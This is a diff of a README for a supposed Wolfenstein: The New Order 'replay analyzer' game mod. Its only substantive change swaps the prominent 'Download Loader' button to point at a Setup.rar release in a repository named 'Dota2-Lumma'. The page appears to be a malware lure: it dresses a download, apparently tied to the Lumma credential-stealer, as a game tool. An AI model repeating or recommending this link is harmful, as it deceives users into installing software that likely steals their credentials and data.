@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Wolfenstein: The New Order Replay Analyzer
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `Wolfenstein-The-New-Order-Replay-Analyzer` · Updated: 2026-11-04
 
 **Tags:** `wolfenstein-the-new-order` `replay-analyzer` `shooter` `campaign` `loadout` `windows` `steam`
+
 
